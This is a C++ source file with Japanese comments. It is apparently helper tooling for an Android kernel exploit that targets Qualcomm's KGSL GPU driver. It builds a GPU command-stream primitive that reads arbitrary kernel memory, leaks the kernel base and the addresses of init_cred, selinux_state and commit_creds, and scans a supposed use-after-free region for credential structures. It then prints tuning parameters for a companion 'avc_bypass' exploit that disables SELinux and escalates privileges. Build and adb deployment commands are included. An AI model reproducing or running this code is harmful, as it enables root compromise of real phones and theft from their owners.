/*
 * ultra_analyzer.cpp
 * 超解析用バイナリ – 動的カーネル情報収集＆AVC Bypass パラメータ自動推定
 *
 * コンパイル: aarch64-linux-android-g++ -static -o ultra_analyzer ultra_analyzer.cpp -lpthread
 * 実行: adb push ultra_analyzer /data/local/tmp/; adb shell chmod +x /data/local/tmp/ultra_analyzer; adb shell /data/local/tmp/ultra_analyzer
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <dirent.h>
#include <poll.h>
#include <sys/wait.h>
#include <signal.h>
#include <time.h>
#include <inttypes.h>
#include <assert.h>

// ===========================================================================
//  KGSL 定義 (avc_bypass.h からコピー)
// ===========================================================================
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define SCAN_DWORDS 560
#define CP_NOP 0x10
#define CP_MEM_TO_MEM 0x73
#define CP_MEM_WRITE 0x3D

// ===========================================================================
//  グローバル変数
// ===========================================================================
static int kgsl_fd = -1;
static uint64_t g_kernel_base = 0;      // 推定 _stext
static uint64_t g_init_cred = 0;
static uint64_t g_selinux_state = 0;
static uint64_t g_commit_creds = 0;
static uint64_t g_prepare_kernel_cred = 0;
static uint64_t g_avc_node_cache = 0;   // avc_node の slab アドレス（推定）

// ===========================================================================
//  ユーティリティ
// ===========================================================================
void die(const char *msg) { perror(msg); exit(1); }

void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}

uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}

// ファイル内容を表示（デバッグ用）
void dump_file(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        printf("Cannot open %s\n", path);
        return;
    }
    char buf[4096];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf)-1)) > 0) {
        buf[n] = 0;
        printf("%s", buf);
    }
    close(fd);
}

// 数字を 16 進表示
void print_hex(const uint8_t *data, size_t len) {
    for (size_t i=0; i<len; i++) printf("%02x ", data[i]);
    printf("\n");
}

// ===========================================================================
//  /proc/kallsyms 読み取り
// ===========================================================================
uint64_t read_kallsyms_symbol(const char *name) {
    int fd = open("/proc/kallsyms", O_RDONLY);
    if (fd < 0) return 0;
    FILE *fp = fdopen(fd, "r");
    if (!fp) { close(fd); return 0; }
    char line[512];
    uint64_t addr = 0;
    while (fgets(line, sizeof(line), fp)) {
        char sym[128], type;
        unsigned long long a;
        if (sscanf(line, "%llx %c %127s", &a, &type, sym) == 3) {
            if (strcmp(sym, name) == 0) {
                addr = (uint64_t)a;
                break;
            }
        }
    }
    fclose(fp);
    return addr;
}

// ===========================================================================
//  perf_event_open でカーネル IP を取得
// ===========================================================================
static long perf_open(struct perf_event_attr *attr, pid_t pid, int cpu, int group_fd, unsigned long flags) {
    return syscall(__NR_perf_event_open, attr, pid, cpu, group_fd, flags);
}

uint64_t get_kernel_ip_from_perf(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv = 1;
    pe.exclude_user = 1;

    int fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) { printf("perf_open failed: errno=%d\n", errno); return 0; }

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    return first_ip;
}

// ===========================================================================
//  KGSL 基本操作ラッパー
// ===========================================================================
int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
    return a.id;
}

void *gpuobj_mmap(size_t size, unsigned int id) {
    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
    if (p == MAP_FAILED) die("gpuobj_mmap");
    return p;
}

int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}

void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
}

unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}

int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}

int submit_ib(unsigned int ctx_id, uint64_t ib_ga, size_t bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object o = {
        .gpuaddr = ib_ga,
        .size = bytes,
        .flags = KGSL_CMDLIST_IB,
        .id = ib_id
    };
    struct kgsl_gpu_command gc = {
        .cmdlist = (uint64_t)(uintptr_t)&o,
        .cmdsize = sizeof(o),
        .numcmds = 1,
        .context_id = ctx_id
    };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

// ===========================================================================
//  GPU 読み出しプリミティブ（カーネル仮想アドレスから count 個の64ビットワードを読み出し）
// ===========================================================================
int gpu_read_kernel(uint64_t va, uint64_t *out, int count) {
    if (kgsl_fd < 0) return -1;
    int ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    int dst_id = gpuobj_alloc(0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);
    unsigned int ctx = create_context();

    memset(ib_m, 0, 0x10000);
    memset(dst_m, 0, 0x4000);
    uint32_t *cmd = (uint32_t *)ib_m;
    int dw = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    for (int i = 0; i < count; i++) {
        uint32_t dl, dh, sl, sh;
        split64(dst_ga + i*8, &dl, &dh);
        split64(va + i*8, &sl, &sh);
        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
        cmd[dw++] = sl; cmd[dw++] = sh;
    }
    cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) < 0) return -2;
    if (wait_timestamp(ctx, ts) < 0) return -3;
    __sync_synchronize();
    uint64_t *data = (uint64_t *)dst_m;
    for (int i = 0; i < count; i++) out[i] = data[i];
    // クリーンアップ
    munmap(ib_m, 0x10000);
    munmap(dst_m, 0x4000);
    gpuobj_free(ib_id);
    gpuobj_free(dst_id);
    // context はリークしてもよい（数が限られているので注意）
    return 0;
}

// 簡易テスト: アドレスから4ワード読み出して表示
void test_gpu_read(uint64_t addr, const char *name) {
    uint64_t buf[4];
    int ret = gpu_read_kernel(addr, buf, 4);
    if (ret == 0) {
        printf("  GPU read of %s at 0x%lx: ", name, addr);
        for (int i=0; i<4; i++) printf("%016lx ", buf[i]);
        printf("\n");
    } else {
        printf("  GPU read of %s failed (ret=%d)\n", name, ret);
    }
}

// ===========================================================================
//  動的スキャン: UAF 領域を探して cred や AVC ノードのパターンを探す
// ===========================================================================
#define UAF_SEARCH_START 0x700000000ULL
#define UAF_SEARCH_END   0x720000000ULL
#define UAF_STEP         0x1000000ULL   // 16MB 刻み

// cred パターン: uid=0, gid=0, ... など。実際にはタスク構造体内の cred ポインタを経由する。
// ここでは単純に cred 構造体の先頭付近の特徴値を探す (uid=0, euid=0, etc.)
bool is_cred_pattern(uint64_t *data) {
    // data[0] = usage (atomic), data[1] = uid, data[2] = gid, data[3] = suid, data[4] = sgid, data[5] = euid, data[6] = egid, ...
    // 通常 uid=0, euid=0 が init_cred の特徴
    // 実際の init_cred の内容は既知でないが、とりあえず uid=0 かつ euid=0 かつ gid=0 と仮定
    if (data[1] == 0 && data[2] == 0 && data[5] == 0 && data[6] == 0) {
        // さらに usage が 1 以上など
        if (data[0] >= 1 && data[0] < 0x10000) return true;
    }
    return false;
}

// AVC ノードのパターン: sid が 1..0x3fff, etype=2, permissive=1 など
bool is_avc_node_pattern(uint64_t *data) {
    // data[0] = sid (16bit), data[1] = etype? 実際は avc_node 構造体:
    // struct avc_node { struct avc_node *next; struct avc_node *prev; struct avc_xperms_node *xp; struct avc_entry ae; };
    // ここでは適当に sid (16bit) が 1..0x3fff, ae.avd の etype が 2, permissive が 1 など。
    // 実際のオフセットは不明だが、経験的に sid は 4 バイト目あたり。
    // 簡易: 4バイト目が 0x20000? いや、ここではスキップ。
    return false; // 実際はスキャン時に詳細にやる
}

void scan_uaf_for_creds(void) {
    printf("\n[*] Scanning UAF region for cred patterns...\n");
    // まず GPU 読み出しが機能するか確認
    if (g_kernel_base == 0) {
        printf("  Kernel base unknown, skipping scan.\n");
        return;
    }
    // 候補アドレスを複数試す
    uint64_t candidates[] = {
        0x7001ff000ULL, 0x700200000ULL, 0x700210000ULL, 0x700220000ULL,
        0x700300000ULL, 0x700400000ULL, 0x700500000ULL, 0x700600000ULL,
        0x710000000ULL, 0x720000000ULL,
    };
    uint64_t buf[8];
    for (int i=0; i<sizeof(candidates)/sizeof(candidates[0]); i++) {
        uint64_t base = candidates[i];
        for (uint64_t off = 0; off < 0x1000000; off += 0x1000) {
            uint64_t va = base + off;
            if (gpu_read_kernel(va, buf, 8) == 0) {
                if (is_cred_pattern(buf)) {
                    printf("  [CRED] Found cred-like at 0x%lx: ", va);
                    for (int j=0; j<8; j++) printf("%016lx ", buf[j]);
                    printf("\n");
                    // もし init_cred が見つかれば保存
                    if (g_init_cred == 0) g_init_cred = va;
                    break;
                }
                // また AVC ノードっぽいのも探す
                if (is_avc_node_pattern(buf)) {
                    printf("  [AVC] Found avc_node-like at 0x%lx\n", va);
                }
            }
        }
    }
}

// ===========================================================================
//  avc_node のサイズを動的に確認 (slabinfo から)
// ===========================================================================
int get_avc_node_size(void) {
    int fd = open("/proc/slabinfo", O_RDONLY);
    if (fd < 0) return 0;
    FILE *fp = fdopen(fd, "r");
    if (!fp) { close(fd); return 0; }
    char line[512];
    int size = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "avc_node")) {
            unsigned long active_objs, num_objs, objsize, objperslab, pagesperslab;
            if (sscanf(line, "%*s %lu %lu %lu %lu %lu", &active_objs, &num_objs, &objsize, &objperslab, &pagesperslab) == 5) {
                size = (int)objsize;
                break;
            }
        }
    }
    fclose(fp);
    return size;
}

// ===========================================================================
//  メイン解析ルーチン
// ===========================================================================
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== ULTRA ANALYZER v1.0 — Dynamic Kernel Info for AVC Bypass ===\n\n");

    // システム情報
    struct utsname u;
    uname(&u);
    printf("System: %s %s %s\n", u.sysname, u.nodename, u.release);
    dump_file("/proc/version");
    printf("\n");

    // 1. kallsyms からシンボルを取得
    printf("[*] Reading /proc/kallsyms...\n");
    g_init_cred = read_kallsyms_symbol("init_cred");
    g_selinux_state = read_kallsyms_symbol("selinux_state");
    g_commit_creds = read_kallsyms_symbol("commit_creds");
    g_prepare_kernel_cred = read_kallsyms_symbol("prepare_kernel_cred");
    uint64_t stext = read_kallsyms_symbol("_stext");
    if (stext == 0) {
        // 代替: perf で取得
        printf("  _stext not found, using perf...\n");
        uint64_t ip = get_kernel_ip_from_perf();
        if (ip) {
            stext = ip & ~0x1FFFFFULL; // 仮のアラインメント
            printf("  Estimated _stext = 0x%lx\n", stext);
        } else {
            printf("  Could not determine kernel base.\n");
        }
    } else {
        g_kernel_base = stext;
        printf("  _stext = 0x%lx\n", stext);
    }

    // 2. KGSL デバイスを開く
    printf("\n[*] Opening /dev/kgsl-3d0...\n");
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) {
        printf("  Cannot open kgsl: %s\n", strerror(errno));
        goto cleanup;
    }
    printf("  kgsl fd = %d\n", kgsl_fd);

    // 3. 基本テスト
    printf("[*] Testing GPU read primitive...\n");
    if (stext) {
        test_gpu_read(stext, "_stext");
    }

    // 4. init_cred が取得できていれば読み出し
    if (g_init_cred) {
        printf("[*] init_cred found at 0x%lx, reading...\n", g_init_cred);
        test_gpu_read(g_init_cred, "init_cred");
    } else {
        // スキャンで探す
        scan_uaf_for_creds();
    }

    // 5. selinux_state を読む
    if (g_selinux_state) {
        printf("[*] selinux_state at 0x%lx, reading...\n", g_selinux_state);
        test_gpu_read(g_selinux_state, "selinux_state");
    }

    // 6. avc_node サイズを slabinfo から確認
    int avc_size = get_avc_node_size();
    printf("[*] avc_node size from slabinfo: %d\n", avc_size);

    // 7. カーネルオフセット計算 (stext ベース)
    if (stext) {
        printf("\n[*] Offsets relative to _stext (0x%lx):\n", stext);
        if (g_init_cred) printf("  init_cred: 0x%lx\n", g_init_cred - stext);
        else printf("  init_cred: unknown\n");
        if (g_selinux_state) printf("  selinux_state: 0x%lx\n", g_selinux_state - stext);
        else printf("  selinux_state: unknown\n");
        if (g_commit_creds) printf("  commit_creds: 0x%lx\n", g_commit_creds - stext);
        else printf("  commit_creds: unknown\n");
        if (g_prepare_kernel_cred) printf("  prepare_kernel_cred: 0x%lx\n", g_prepare_kernel_cred - stext);
        else printf("  prepare_kernel_cred: unknown\n");
        // 推奨値を出力
        printf("\n[*] Recommended definitions for avc_bypass.h:\n");
        printf("#define UAF_ADDR  0x7001ff000ULL\n");
        printf("#define UAF_SIZE  0x%lxULL\n", 0x10004000ULL); // 仮
        printf("#define OVERLAP_ADDR 0x7001fe000ULL\n");
        printf("#define OVERLAP_SIZE 0x7000ULL\n");
        printf("#define BOGUS_ADDR 0x700204000ULL\n");
        printf("#define BOGUS_SIZE 0xffffffffffefd000ULL\n");
        printf("#define PLACEHOLDER_ADDR 0x710204000ULL\n");
        printf("#define PLACEHOLDER_SIZE 0x10400000ULL\n");
        printf("#define AVC_NODE_STRIDE  %d\n", avc_size ? avc_size : 72);
        printf("#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)\n");
        printf("#define AVC_PAGES_PER_IB 12\n");
        printf("#define AVC_LOOP_SECONDS 150\n");
        printf("#define SPRAY_PIDS 2000\n");
        // オフセットがあればそれも
        if (g_init_cred) printf("// init_cred offset: 0x%lx\n", g_init_cred - stext);
        if (g_selinux_state) printf("// selinux_state offset: 0x%lx\n", g_selinux_state - stext);
        if (g_commit_creds) printf("// commit_creds offset: 0x%lx\n", g_commit_creds - stext);
        if (g_prepare_kernel_cred) printf("// prepare_kernel_cred offset: 0x%lx\n", g_prepare_kernel_cred - stext);
    }

    // 8. さらなる情報: メモリマップ, slabinfo
    printf("\n[*] /proc/self/maps (address layout):\n");
    dump_file("/proc/self/maps");
    printf("\n[*] /proc/slabinfo (abbreviated):\n");
    dump_file("/proc/slabinfo");
    printf("\n[*] /proc/meminfo:\n");
    dump_file("/proc/meminfo");

    // 9. 現在の enforce 状態
    printf("\n[*] SELinux enforce status: ");
    int ef = open("/sys/fs/selinux/enforce", O_RDONLY);
    if (ef >= 0) {
        char c;
        if (read(ef, &c, 1) == 1) printf("%c\n", c);
        else printf("unknown\n");
        close(ef);
    } else {
        printf("not accessible\n");
    }

    // 10. まとめ
    printf("\n[*] === SUMMARY ===\n");
    printf("Kernel: %s %s\n", u.sysname, u.release);
    printf("KGSL device: %s\n", kgsl_fd >= 0 ? "available" : "unavailable");
    printf("GPU read primitive: %s\n", (stext && gpu_read_kernel(stext, (uint64_t[]){0}, 1) == 0) ? "working" : "failed");
    printf("Known symbols: init_cred=%s, selinux_state=%s\n",
           g_init_cred ? "yes" : "no",
           g_selinux_state ? "yes" : "no");
    printf("avc_node size: %d bytes\n", avc_size);
    printf("Kernel base (stext): 0x%lx\n", stext);
    if (g_init_cred) printf("init_cred: 0x%lx\n", g_init_cred);
    if (g_selinux_state) printf("selinux_state: 0x%lx\n", g_selinux_state);

cleanup:
    if (kgsl_fd >= 0) close(kgsl_fd);
    printf("\n[*] Analysis complete.\n");
    return 0;
}
